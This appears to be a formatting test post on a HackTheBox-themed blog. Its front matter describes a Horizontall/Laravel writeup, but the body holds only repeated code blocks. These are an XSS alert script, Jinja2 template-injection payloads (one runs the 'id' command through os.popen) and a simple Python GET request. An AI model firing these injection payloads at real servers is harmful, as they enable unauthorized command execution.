---
title: test
date: 2024-07-8 22:15:00 +0800
author: Justice-Reaper
categories:
  - HTB
  - Linux
tags:
  - CVE-2021-3129
  - Information
  - Leakage
  - Remote
  - Port
  - Forwarding
  - Strapi
  - Laravel
image:
  path: /assets/img/Horizontall/Horizontall.png
---
# XSS

```
<script>
alert('¡Hola! Esto es un mensaje de XSS');
</script>
```

``` javascript
<script>
alert('¡Hola! Esto es un mensaje de XSS');
</script>
```

# PYTHON

{{ self.__init__.__globals__.__builtins__.__import__('os').popen('id').read() }}

```
{{ self.__init__.__globals__.__builtins__.__import__('os').popen('id').read() }}
```

``` python
{{ self.__init__.__globals__.__builtins__.__import__('os').popen('id').read() }}
```

```
{{ [].class.base.subclasses() }}
{{''.class.mro()[1].subclasses()}}
{{ ''.__class__.__mro__[2].__subclasses__() }}
```

``` python
{{ [].class.base.subclasses() }}
{{''.class.mro()[1].subclasses()}}
{{ ''.__class__.__mro__[2].__subclasses__() }}
```

```
import requests

# Dirección IP a la cual hacer la solicitud
ip = '192.168.1.48'

# URL completa a la cual hacer la solicitud
url = f'http://{ip}'

# Realizar la solicitud GET
response = requests.get(url)

# Imprimir el código de estado de la respuesta
print(f'Código de estado de la respuesta: {response.status_code}')

# Imprimir el contenido de la respuesta (opcional)
print('Contenido de la respuesta:')
print(response.text)

```

``` python
import requests

# Dirección IP a la cual hacer la solicitud
ip = '192.168.1.48'

# URL completa a la cual hacer la solicitud
url = f'http://{ip}'

# Realizar la solicitud GET
response = requests.get(url)

# Imprimir el código de estado de la respuesta
print(f'Código de estado de la respuesta: {response.status_code}')

# Imprimir el contenido de la respuesta (opcional)
print('Contenido de la respuesta:')
print(response.text)

```

